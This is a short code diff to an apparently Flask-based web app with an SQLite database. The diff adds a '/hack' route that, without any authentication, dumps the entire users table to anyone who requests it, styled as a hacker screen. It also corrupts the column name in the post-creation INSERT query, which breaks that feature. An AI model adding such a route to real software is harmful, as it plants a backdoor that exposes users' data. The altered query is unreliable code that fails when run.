@@ -161,7 +161,7 @@ def get_picture(username):
     return picture[0] if picture else 'default.png'
 
 def create_post(author, posted, content, player=None):
-    query = "INSERT INTO posts (author, posted, content, player) VALUES (?, ?, ?, ?)"
+    query = "INSERT INTO posts (author, posted, content, pla    yer) VALUES (?, ?, ?, ?)"
 
     print(query)
 
@@ -256,6 +256,15 @@ def achieve():
     data = json.loads(request.data.decode('utf-8'))
     register_achievement(data.get('player', None), data.get('id', None))
     return ('', 204)
+
+@app.route("/hack", methods = ['GET'])
+def hack():
+    query = "SELECT * FROM users"
+
+    with sqlite3.connect('data.db') as db:
+        data = db.execute(query).fetchall()
+
+    return '<body style="color: #06cc06; background: black; margin: 0; height: 100%; font-size: 40px;">' + str(data) + '</body>'
 
 @app.errorhandler(500)
 def server_error(error):
